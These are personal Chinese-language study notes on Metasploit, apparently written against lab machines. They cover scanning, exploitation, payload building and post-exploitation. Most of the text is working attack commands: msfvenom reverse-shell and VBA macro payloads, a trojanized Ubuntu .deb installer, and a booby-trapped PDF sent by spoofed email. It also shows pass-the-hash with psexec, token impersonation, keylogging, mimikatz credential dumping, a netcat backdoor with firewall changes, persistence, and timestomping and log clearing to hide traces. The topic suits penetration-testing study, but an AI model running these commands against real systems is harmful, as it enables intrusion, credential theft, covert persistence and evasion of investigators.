# Metasploit 笔记

## PTES

前期交互/情报搜集/威胁建模/漏洞分析/渗透攻击/后渗透攻击/报告阶段

## 渗透测试

白盒/黑盒/灰盒

## MSF 基础

`/usr/share/metasploit-framework/modules` msf模块位置

`auxiliary` 探测器（如端口扫描/嗅探/枚举）

`exploits` 使用特定攻击载荷

`payloads` 远程执行代码

`encoders` 编码器（如各种汇编语言）

`nops` 

```shell
msfconsole -m a/secret/module # 以模块启动
msf> loadpath <path> # 载入模块文件夹
```

### MSFconsole Command Cheatsheet

```
back          Move back from the current context
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
edit          Edit the current module with $VISUAL or $EDITOR
exit          Exit the console
get           Gets the value of a context-specific variable
getg          Gets the value of a global variable
grep          Grep the output of another command
  grep <pattern> <command>
help          Help menu
info          Displays information about one or more module
irb           Drop into irb scripting mode
jobs          Displays and manages jobs
kill          Kill a job
load          Load a framework plugin
loadpath      Searches for and loads modules from a path
makerc        Save commands entered since start to a file
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
quit          Exit the console
reload_all    Reloads all modules from all defined module paths
rename_job    Rename a job
resource      Run the commands stored in a file
route         Route traffic through a session
save          Saves the active datastores
search        Searches module names and descriptions
  search name:http
  search rank:good
  search platform:aix
  search type:post
  search cve:2011 author:jduck platform:linux
  
sessions      Dump session listings and display information about sessions
show          Display modules or so
  show options
  show targets     Display exploit targets
  show encoders
  show exploit
  show nops
  show payloads    Only display compatible payloads
set           Sets a context-specific variable to a value
setg          Sets a global variable to a value
show          Displays modules of a given type, or all modules
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context-specific variables
unsetg        Unsets one or more global variables
use           Selects a module by name
version       Show the framework and console library version numbers


```

### 使用 Exploit

```shell
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
help # check exploit commands
info
save
show targets
show payloads
show options
show advanced
show evasion
back
```

### Payload 解释

Metasploit中，Payload分为`Singles`/`Stagers`/`Stages`三种

>`windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (bind_tcp) and a stage (shell).

Single 单独payload即可完成操作

Stager 目标与本机之间网络连接

Stage TBD

### Payload 类型

内联Inline/Stager/Meterpreter（注入到内存中，不在硬盘留痕迹）

PassiveX（通过ActiveX）/ NoNX（No NoeXecute 绕过系统NX/DEP）

Ord/IPv6/Reflective DLL injection

### 生成 Payload

```shell
use payload/windows/shell_bind_tcp
show options
generate
  -h
  -o <filename> # output file
  -f <format> # output format
  -e <encoder> # specify encoder
  -b '\x00' # disallow special byte
  -i <count> # iteration
  -n <size> # nopsled at the beginning
  <option>=<value> ...
```

fun fact：只去除`\x00`时使用的是`x86/shikata_ga_nai`，而多加一些使用的是其他的Encoder

### 数据库

```shell
help database

services
  -p <port>
  -c
  -S <pattern> # Search
hosts
  -c <column>
  -R # set RHOSTS from result
workspace
  -a # add
  -d # delete
creds
  add user:<name> password:<pw> realm:<group>
loot
  
 
db_import <xml>
db_export
  -f
```

### 简单示范

```shell
db_nmap -A -T4 192.168.20.134
use exploit/multi/samba/usermap_script
hosts -R
run
background
sessions
use post/linux/gather/hashdump
show options
set session 1
run
loot
```

### Meterpreter

#### 创建简易Reverse Shell

```shell
use payload/linux/x64/meterpreter_reverse_tcp # notice underscore _
setg lhost 192.168.20.133
setg lport 4448
generate -f elf -o shell
chmod 777 shell
use exploit/multi/handler
set payload payload/linux/x64/meterpreter_reverse_tcp # if you change from payload module, exploit might automatically use it
exploit

# remote machine execute ./shell
./shell

# local machine:
[*] Started reverse TCP handler on 192.168.20.133:4448 
[*] Meterpreter session 11 opened (192.168.20.133:4448 -> 192.168.20.133:46300) at 2022-10-06 21:13:06 +0800

(Meterpreter 11)(/home/frnks) >
```

#### 命令

```shell
help
bg/cat/cd/pwd/ls/ps
clearev # clear logs on Windows system
download <path> # Windows path uses \\
edit # edit file via vim
execute
getuid
run post/<arch>/gather/hashdump
idletime
ipconfig
lpwd/lcd # local machine pwd/cd
resource # auto-execute commands in a file
search -f <pattern>
shell
upload <file> <remote_path>
webcam_list
webcam_snap
```


## 情报搜集


### 主动信息搜集

#### 端口扫描

##### nmap

```
-sS 隐秘TCP扫描
-sC 默认方案扫描
-sI <idle host> <target host> 利用空闲主机扫描目标主机
-Pn 不用ping（内网不需要，互联网最好要）
-oX 输出XML
-oA 输出信息并且导入数据库
```

Metasploit 使用数据库

```shell
> /etc/init.d/postgresql start
msf> db_connect postgres:toor@127.0.0.1/msf
msf> db_status
msf> db_import xxx.xml
msf> hosts -c address
```

Metasploit 运行nmap

```
db_connect ...
db_nmap -A 
```

##### Metasploit 端口扫描模块

```shell
search portscan

use auxiliary/scanner/portscan/syn
hosts -R
show options
run
```

#### 版本扫描
以开放了`445`端口的smb为例：
```
use auxiliary/scanner/smb/smb_version
set ......
run
hosts
```

#### 空闲主机扫描
nmap的IPID Idle Scanning需要一台空闲的并且IPID序列的类型为`"Incremental"` / `"Broken little-endian incremental"`的主机
```
use auxiliary/scanner/ip/ipidseq
set threads 64
run

db_nmap -Pn -sI <idle host> <target host>
```

#### MSSQL 扫描

在大局域网中要比nmap扫描快得多

搜索mssql采用了一种叫做`UDP foot-printing`的方法：
TCP:1433为默认端口，如果端口随机分配，1434端口提供了服务监听信息
```shell
search mssql

use auxiliary/scanner/mssql/mssql_ping
set ...
run

use auxiliary/scanner/mssql/mssql_login # 暴力字典破解密码 或者：
hydra -l admin -P <dict> -t <threads> <serverip> mssql

use auxiliary/admin/mssql/mssql_exec # 执行命令
set CMD net user bacon <randompw> /ADD # 创建用户
run
set CMD net localgroup administrators bacon /ADD # 将该用户设为管理员
run
```

#### 服务扫描
ssh：
```
use auxiliary/scanner/ssh/ssh_version
set ...
run
```
ftp:
```
use auxiliary/scanner/ftp/ftp_version
run
```
ftp匿名登录：
```
use auxiliary/scanner/ftp/anonymous
run
```

#### SNMP扫描
SNMP Community String read-only / read-write
SNMP团体字符串

若能猜出这些Strings，就可以轻松获得很多目标信息

> **Note**: By default Metasploitable’s SNMP service only listens on localhost. Many of the examples demonstrated here will require you to change these default settings. Open and edit **/etc/default/snmpd**, and change the following from:
> 
> `SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1'`
> to
> `SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'`

```
search snmp
use auxiliary/scanner/snmp/snmp_login
show options
set ...
run
```

##### 枚举
```
use auxiliary/scanner/snmp/snmp_enum
run
```

##### 登录

```
use auxiliary/scanner/snmp/snmp_login
set threads 64
hosts -R
run
```

#### Windows补丁枚举
获取目标Windows系统安装的补丁信息，我们可以获得该系统现有的破解可能

```shell
use post/windows/gather/enum_patches
show options
set session <id> # 需要先建立Meterpreter Session
```

#### 编写扫描器
需要一点Ruby语言知识，下面是个示范TCP固定端口扫描器：
```ruby
#Metasploit
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
    include Msf::Exploit::Remote::Tcp
    include Msf::Auxiliary::Scanner
    def initialize
        super(
            'Name' => 'Frnks\' Custom TCP Scanner for Example',
            'Version' => '$Revision : 1$',
            'Description' => 'ABAABA',
            'Author' => 'frnks',
            'License' => MSF_LICENSE
        )
        register_options(
            [
              Opt::RPORT(25565)
            ],
            self.class
        )
    end
    def run_host(ip)
      connect()
      sock.puts('HELLO SERVER')
      data = sock.recv(1024)
      print_status("Received: #{data} from #{ip}")
      disconnect()
    end
end
```

```
> echo "hello metasploit\!" > banner.txt
> nc -lvnp 25565 < banner.txt

msf> set rhosts 127.0.0.1
[msf](Jobs:0 Agents:0) auxiliary(scanner/simple_tcp_example) >> run

[*] 127.0.0.1:25565       - Received: hello metasploit!
 from 127.0.0.1
[*] 127.0.0.1:25565       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 被动信息搜集

#### 搜索引擎
OSINT
Google `site:host.com keyword`

#### 密码嗅探
Metasploit中`psnuffle`模块可以通过`POP3, IMAP, FTP, HTTP GET`嗅探密码：
```
use auxiliary/sniffer/psnuffle
run
```
也可以导入pcap（Wireshark）文件进行嗅探

#### 自定义psnuffle模块
TODO

## 脆弱性检查

### SSH 登录

SSH登录有两种方式：用户名密码/私钥。
MoreInfo： https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits

如果获取到了`ssh_id_rsa`文件即私钥的话，可以使用`ssh_login_pubkey`模块：
```
use auxiliary/scanner/ssh/ssh_login_pubkey
hosts -R
set private_key file:<prikey_file_path>
set username root
run
```

或者也可以暴力尝试USERPASS：
```
use auxiliary/scanner/ssh/ssh_login
host -R
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
run
```

### SMB 登录

如果获取到了用户名密钥对，但又不知道在哪里可以登录，使用smb_login来尝试（注意这个模块会产生大量的事件日志）
```shell
use auxiliary/scanner/smb/smb_login
show options
set ...
run

```

### VNC 开放认证

VNC Authentication None Scanner 模块可以扫描没有设置密码的VNC服务

```
use auxiliary/scanner/vnc/vnc_none_auth
```

### X11 开放认证

类似VNC，但是X11太老了

```
use auxiliary/scanner/x11/open_x11 
```

### WMAP Web扫描

基于SQLMap的Web应用脆弱性检查工具
其中`brute_dir`模块与`dirbuster/gobuster`功能类似

```shell
load wmap
wmap_modules -h
wmap_sites -a http://<target_ip>
wmap_targets -t http://<target_ip>/...
wmap_run -t # list modules
wmap_run -e # run test
wmap_vulns -l
```

## 编写Fuzzer

Fuzzer是一种测试未知输入的工具，比如：测试输入是否可以导致缓冲区溢出、格式化字符串、文件系统遍历、代码执行、SQL注入、XSS等等...

## 开发Exploit

TBD

## 网络渗透攻击

### 全端口遍历 ❖

若防火墙有严格的出站规则过滤，Reverse Shell需要找到一个能出站的端口：
```
set payload windows/meterpreter/reverse_tcp_allports
```

### MSSQL 攻击

暴力破解密码：

```
use auxiliary/scanner/mssql/mssql_login
set PASS_FILE ...
...SNIP...
exploit
```

xp_cmdshell 是mssql的内建程序，可以执行操作系统指令:

```
use auxiliary/scanner/mssql/mssql_payload
set payload windows/meterpreter/reverse_tcp
```

## Metepreter 

```
screenshot
sysinfo

```


## 客户端攻击

通过社会工程学手段让客户端访问某个网页/执行某段代码

### 浏览器渗透攻击

#### 堆散射 Heap Spraying

将NopSled和Shellcode结合成固定的形式，然后将它们重复填充到堆中，直到填满一大块内存，但程序的执行流发生改变的时候，会随机跳转到内存中的某一地方，这个内存地址大概率已经被NopSled占领了，而后的shellcode也会随即运行。

#### Metasploit NopSled

```shell
> msfvenom -p windows/shell/bind_tcp LPORT=443 -f c -o shellcode.c
```

可以看到C文件中定义了一个极大的数组来存放Payload数据，而前面很大一部分都是\\x90 nop指令，可以输出为exe文件或者elf文件并用x64dbg或者ida来分析。

#### 实例：极光漏洞

```
msfconsole > use windows/browser/ms10_002_aurora
msfconsole > set PAYLOAD ......
msfconsole > show options
msfconsole > show advanced

set AutoRunScript migrate -f
```


### 二进制载荷

`msfvenom` 生成reverse shell

```shell
msfvenom --payload-options -p windows/shell/reverse_tcp

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<local> LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe

msfconsole -q

msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/shell/reverse_tcp
set ......
exploit
```

### 二进制Linux木马

Example: 伪造一个deb包作为木马

本机：
```shell
wget http://old-releases.ubuntu.com/ubuntu/pool/universe/f/freesweep/freesweep_0.90-1_i386.deb

mkdir /tmp/evil
mv freesweep_0.90-1_i386.deb /tmp/evil
cd /tmp/evil

dpkg -x freesweep_0.90-1_i386.deb work
mkdir work/DEBIAN
```

创建两个文件：
`control`：
```
Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use.
```

`postinst`：
```shell
#!/bin/sh

sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores
```

```shell
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=<selfip> LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores

chmod 755 postinst
dpkg-deb --build /tmp/evil/work
cd /tmp/evil
mv work.deb freesweep.deb
cp freesweep.deb /var/www/html
service apache2 start
```

在msfconsole中监听443端口：
```shell
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST <selfip>; set LPORT 443; run; exit -y"
```

Remote:
```shell
wget http://<selfip>/freesweep.deb
sudo dpkg -i freesweep.deb
```

### 客户端漏洞利用

Example: Adobe Reader ‘util.printf()’ JavaScript Function Stack Buffer Overflow Vulnerability

木马构建：
```
use exploit/windows/fileformat/adobe_utilprintf
set FILENAME BestComputers-UpgradeInstructions.pdf
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.8.128
set LPORT 4455
show options
exploit
```

本机监听：
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4455
set LHOST 192.168.8.128
exploit
```

sendEmail脚本：
```
sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
```

迁移shell至不同的进程：
```
meterpreter > ps
meterpreter > run post/windows/manage/migrate
```

获取系统信息/提权/记录密码：
```
meterpreter > sysinfo
meterpreter > use priv
meterpreter > run post/windows/capture/keylog_recorder
```

### VB脚本注入

适用于只能传输Office文档的情况，将VB脚本注入Word/Excel文档中

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 -e x86/shikata_ga_nai -f vba-exe
```

结果输出宏脚本和数据，按照提示操作即可

在此之前，先建立好监听Handler：

```
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.101; set LPORT 8080; run; exit -y"
```

## 资源文件

`.rc` Resource File 包含一系列命令的脚本文件

example.rc:
```
version
load sounds
show options
```

加载资源文件：
```shell
> msfconsole -r example.rc
```


## 渗透攻击思路

1. 扫描开放端口，获取不同端口对应的服务信息；
2. 找到某个服务的脆弱性，选择Exploit和Payload，参数设置好；
3. Exploit成功后，最好将Shell升级为Meterpreter；


## 后渗透

渗透之后，我们可以获取目标主机内网其他主机的信息，以该主机为跳板继续渗透整个网络，嗅探数据包/修改注册表/建立后门等等

### 升级Shell

有些Exploit只支持普通shell的payload，我们可以通过`sessions -u <id>`升级shell至meterpreter：
```shell
sessions -u 1

[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.122.248:4433 
[*] Sending stage (989032 bytes) to 192.168.122.136
[*] Command stager progress: 100.00% (773/773 bytes)

# wait a while

[*] Meterpreter session 2 opened (192.168.122.248:4433 -> 192.168.122.136:41211) at 2022-10-21 22:12:07 +0800
[*] Stopping exploit/multi/handler

```

### 提权 ❖

使用 `net user` 命令创建普通用户：

```
Administrator>net user USERNAME PASSWORD /add
```

Metasploit的 `getsystem` 模块可以帮助我们获取系统的管理员权限。

```
meterpreter > run post/windows/escalate/getsystem
```

以IE“Aurora”漏洞攻击为例，攻击成功后我们只能获取到用户权限：

```shell
meterpreter > getuid
meterpreter > use priv #使用priv扩展
meterpreter > getsystem -h
meterpreter > getsystem
meterpreter > getuid
```

#### 载荷程序

```shell
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe -o gift.exe

msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST xxx
msf> set LPORT xxx
msf> exploit

# copy gift.exe to target, and run it as a user.

meterpreter> getuid # a normal user
meterpreter> shell
>^Z # quit shell

meterpreter > use priv
meterpreter > getsystem
```

#### 本地攻击

如果未能通过`getsystem`提权，则可以尝试其他的本地Exploit：

```
msf exploit(ms10_002_aurora) > use exploit/windows/local/
msf exploit(ms10_002_aurora) > use exploit/windows/local/ms10_015_kitrap0d
msf exploit(ms10_015_kitrap0d) > set SESSION 1
msf exploit(ms10_015_kitrap0d) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(ms10_015_kitrap0d) > set LHOST 192.168.1.161
msf exploit(ms10_015_kitrap0d) > set LPORT 4443
msf exploit(ms10_015_kitrap0d) > show options
msf exploit(ms10_015_kitrap0d) > exploit
```

### SSH 获取密钥

获取了Shell之后，我们可以使用`ssh_creds`获取文件系统中的ssh相关文件：
```
use post/multi/gather/ssh_creds
set session <id>
run
loot
```

### 哈希获取 ❖

Windows系统存储哈希的方式有 LAN Manager(LM) / NT LAN Manager(NTLM) / NT LAN Manager v2(NTLMv2)。LM存储会将密码切分为7个字符的块进行哈希（很容易破解），NTLM则是整段哈希。

```
Administrator:500:LMHASH:NTLMHASH::

if length > 14:
Administrator:500:aad3b4...:NTLMHASH
aad3b4开头的哈希是空值占位符，因为长度太长所以使用NTLM存储
```

```
use priv
run post/windows/gather/hashdump
```

### PSEXEC 哈希传递 ❖

`psexec` 模块用于已知某个用户密码哈希，但是又无法在可能时间内破解明文的情况下登录系统。

一般来说进入系统后，就是使用**fgdump**, **pwdump** 或者 **cachedump** 等模块/工具来获取密码哈希，然后使用彩虹表等工具破解哈希获取密码

也有像 **iam.exe** 这样的工具可以让你自己输入密码/哈希，无需破解即可获取访问。而`psexec`就可以让我们只使用哈希即可登录系统，如果此系统的管理员帐号都是相同的，我们就可以畅游目标内网。

注意如果NTLM是唯一一个登录服务（比如说密码哈希有15+字符长或者组策略中只允许NTLM响应），可以将 `****NOPASSWORD****` 替换成32个0：

```
******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c

00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c
```

若遇到：
```
STATUS_ACCESS_DENIED (Command=117 WordCount=0)
```
可以通过修改注册表：`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters` 中的 `RequireSecuritySignature` 为 `0` 

#### 过程

获取到shell之后：
```
meterpreter > run post/windows/gather/hashdump

...snip...
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
```

`e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c` 即为密码哈希

```
search psexec
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.57.133
set LPORT 443
set RHOST 192.168.57.131
show options
set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
exploit
shell
```

通过 `psexec` 我们无需耗时破解密码即可提权。

### 事件日志

https://www.offensive-security.com/metasploit-unleashed/event-log-management/


### Incognito模块 令牌假冒 ❖

`incognito` 可以使用Cookies等tokens来假装某个用户而不需要在意密码/哈希，tokens一般分为两种：delegate/impersonate，前者用于互动式登录（如远程桌面），后者用于被动式登录（如访问一个网络存储，文件服务器是重点关注对象）

以 `ms08_067_netapi` 为例：

```
use exploit/windows/smb/ms08_067_netapi
set RHOST 10.211.55.140
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.211.55.162
set LANG english
show targets
set TARGET 8
exploit
```

```
use incognito
help
```

首先检查系统上是否有存储可见的tokens：
```
meterpreter > list_tokens -u
```
Administrator无法查看所有的tokens，但是可以迁移到SYSTEM进程从而获取到SYSTEM权限
获取到Administrator的tokens后，使用：
```shell
meterpreter > impersonate_token SNEAKS.IN\\Administrator
# 注意两个斜杠来转义单斜杠

# 添加用户
meterpreter > add_user USERNAME PASSWD -h <host>
meterpreter > add_group_user "Domain Admins" USERNAME -h <host>
# -h 后为域控制器的ip地址，一般为目标机局域网地址

meterpreter > getuid
meterpreter > shell
```

### 注册表探索 ❖
快查表：
https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf

```
meterpreter > reg
```

### netcat后门

第一步，将nc上传到system32：
```
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
```
第二步，修改注册表让netcat开机自启并且监听`445`端口：
```
meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'

meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
```
第三步，修改系统以允许防火墙通过netcat流量，使用`netsh`命令修改保证稳定性：
```
meterpreter > execute -f cmd -i

netsh firewall show opmode
netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
netsh firewall show portopening
```

全部完成后，当目标电脑重启时，我们就可以测试nc是否可以访问：
```
nc -v <remoteip> 445

C:\..... > dir
```

实际中不可能这么简单不需要密码/加密即可上传文件/修改系统，但是整体思路都是基本相同的

### 启动远程桌面 ❖

`enable_rdp` 模块可以启动远程桌面，并且创建一个用户进行登录：
```
msf > use post/windows/manage/enable_rdp
msf > show options
```

```shell
> rdesktop -u malfrnks -p password <remoteip>
...
```

你做的修改越多，留下的证据也就越多，所以要记得cleanup自己的踪迹：
```
meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__<specific>.rc
```

### 数据包嗅探 ❖/🐧

首先先获取到meterpreter shell，然后启动sniffer模块：
```
use sniffer
help

sniffer_interfaces
sniffer_start <interface_id>
sniffer_stats <if_id>
sniffer_dump <if_id> path/to/pcap/file
sniffer_stop <if_id>
sniffer_release <if_id>
```

\*Meterpreter通过全加密SSL/TLS隧道传输数据

另外一个模块 `packetrecorder` 也可以：
```
metapreter> run packetrecorder -i <interface>

```

### Pivoting 跳板渗透 ❖/🐧

成功攻击*不可路由网络*的对外主机后，将其作为跳板访问内网机器。
``
在通过exploit获取到shell之后，运行`ipconfig`检查主机网卡接口信息，观察是否为双宿主主机（可以连接内网和外网，内外网不直接通信，若开启路由功能则安全性极低，[More Info](https://www.wangan.com/wenda/8699)），一般有两种cidr：10.0.0.0/8、192.168.0.0/16

若此主机是双宿主的话，我们就可以尽其所用，

可以使用get_local_subnets脚本获取受控系统本地子网信息：
```shell
meterpreter > run get_local_subnets
meterpreter > bg
```
可以使用`autoroute`脚本将其作为我们攻击内网机器的路由器：
```shell
meterpreter > run autoroute -h
meterpreter > run autoroute -s 10.1.13.0/24 # 外网接口地址CIDR
meterpreter > run autoroute -p
```
也可以手动route：
```shell
msf> route add <subnet_prefix> <subnet_mask> <gateway_session>
# route add 192.168.2.0 255.255.255.0 1
msf> route print
```
还有更简单的脚本：
```
msf> load auto_add_route
```

添加了route之后，尝试提权并获取密码哈希：

```
meterpreter > getsystem
meterpreter > run hashdump 

Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
...snip...

Ctrl+Z
```

使用扫描器扫描内网机器开放端口：
```shell
msf exploit(ms10_002_aurora) > use auxiliary/scanner/portscan/tcp

msf auxiliary(tcp) > set RHOSTS 10.1.13.0/24
msf auxiliary(tcp) > set PORTS 139,445
msf auxiliary(tcp) > set THREADS 50
msf auxiliary(tcp) > run

[*] 10.1.13.3:139 - TCP OPEN
[*] 10.1.13.3:445 - TCP OPEN
[*] 10.1.13.2:445 - TCP OPEN
[*] 10.1.13.2:139 - TCP OPEN
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

接下来使用`psexec`模块，因为多数企业使用硬盘镜像软件，所以大概率管理员密码也是相同的，利用我们之前得到的密码哈希登录：
```
msf auxiliary(tcp) > use exploit/windows/smb/psexec 
msf exploit(psexec) > show options
msf exploit(psexec) > set RHOST 10.1.13.2
RHOST => 10.1.13.2
msf exploit(psexec) > set SMBUser Administrator
SMBUser => Administrator
msf exploit(psexec) > set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
SMBPass => 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
msf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf exploit(psexec) > exploit
```

#### PORTFWD 端口转发

使用跳板机器进行端口转发TCP流量：`portfwd` 命令

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
     -L <opt>  The local host to listen on (optional).
     -h        Help banner.
     -l <opt>  The local port to listen on.
     -p <opt>  The remote port to connect on.
     -r <opt>  The remote host to connect on.
```

```
meterpreter > portfwd add –l 3389 –p 3389 –r  [target host]
meterpreter > portfwd delete –l 3389 –p 3389 –r [target host]
meterpreter > portfwd list
meterpreter > portfwd flush
```
3389是Windows远程桌面默认端口

Example：
https://www.offensive-security.com/metasploit-unleashed/portfwd/

### TIMESTOMP ❖

访问文件系统很危险，因为你会留下许多的足迹（footprints），对这些足迹的追查称为电子隐写。
Meterpreter将其载入目标的内存中而不写入硬盘，极大程度减少了足迹的残留，但如果真的需要对文件系统进行操作，可以使用`timestomp`工具：

```shell
meterpreter > use priv
meterpreter > timestomp -h
meterpreter > timestomp test.txt -v
meterpreter > timestomp test.txt -f C:\\WINNT\\system32\\cmd.exe
# 将文件的MAC设置为cmd.exe的MAC
meterpreter > timestomp test.txt -v

Modified      : Tue Dec 07 08:00:00 -0500 1999
Accessed      : Sun May 03 05:14:51 -0400 2009
Created       : Tue Dec 07 08:00:00 -0500 1999
Entry Modified: Sun May 03 05:11:16 -0400 2009
```

### 截屏 ❖

```
meterpreter > screenshot
```

```
meterpreter > ps

Process list
============

    PID   Name                 Path
    ---   ----                 ----
    180   notepad.exe          C:\WINDOWS\system32\notepad.exe
    248   snmp.exe             C:\WINDOWS\System32\snmp.exe
    260   Explorer.EXE         C:\WINDOWS\Explorer.EXE
...

meterpreter > migrate 260
meterpreter > use espia
meterpreter > screengrab
```

### 内容搜索 ❖/🐧

```
meterpreter > search -h
Usage: search [-d dir] [-r recurse] -f pattern
Search for files.

OPTIONS:

    -d   The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
    -f   The file pattern glob to search for. (e.g. *secret*.doc?)
    -h        Help Banner.
    -r   Recursivly search sub directories. (Default: true)
```

example:
```
meterpreter > search -f *.jpg
meterpreter > search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf
```

### 哈希破解（John）❖/🐧

`John The Ripper` 非常好哈希破解工具，使用 `auxiliary/analyze/jtr_crack_fast` 模块

### VNC 远程桌面 ❖

```shell
metapreter> run vnc
# 在远程机器上安装VNC
metapreter> run screen
# 开启VNC桌面
metapreter> run screen_unlock
# 解锁桌面
```

### 迁移进程 ❖

```shell
meterpreter> run post/windows/manage/migrate
```

 ### 系统信息

```
meterpreter> run scraper
```

## 免杀技术

### 自定义Payload

```shell
# 查看该Payload配置
msfvenom -p windows/meterpreter_reverse_tcp --payload-options

msfvenom -p windows/meterpreter_reverse_tcp LHOST=xxx LPORT=xxx -f exe -o gift.exe
```

### MSF编码器

```

```


## 通信维护

### Keylogger ❖

不访问硬盘的情况下捕捉键盘输入

```
meterpreter > ps
meterpreter > migrate 768
meterpreter > getpid
meterpreter > keyscan_start
meterpreter > keyscan_dump
```

记录取决于迁移的进程

另一种是使用Meta的后渗透模块：

```
meterpreter > ps
meterpreter > migrate 768
meterpreter > run post/windows/capture/keylog_recorder  
```

### Meterpreter 后门 ❖

`metsvc` 后门

注意metsvc不需要任何验证，现实情况下需要修改成需要验证或者设置防火墙

```
meterpreter > run metsvc
```

使用 `exploit/multi/handler` 模块，配上 `windows/metsvc_bind_tcp` Payload 来连接metsvc服务

```shell
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
msf exploit(handler) > set LPORT 31337
msf exploit(handler) > set RHOST 192.168.1.104
msf exploit(handler) > show options
msf exploit(handler) > exploit
```

### 持续后门 ❖

```shell
meterpreter > run persistence -h
# example:
meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
```


## MSF 更多功能

### Mimikatz ❖

后渗透工具合集
需要SYSTEM权限

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```shell
meterpreter > load mimikatz
meterpreter > help mimikatz

meterpreter > mimikatz_command -f version
meterpreter > mimikatz_command -f what::
# get list from loading non-existent module
```

### 从内存中读取密码

```
meterpreter > msv
meterpreter > kerberos
meterpreter > mimikatz_command -f samdump::hashes
meterpreter > mimikatz_command -f sekurlsa::searchPasswords
```


## MSF 辅助模块

```
show auxiliary
```

# SET 工具包

```shell
> setoolkit
```

一条龙自动化服务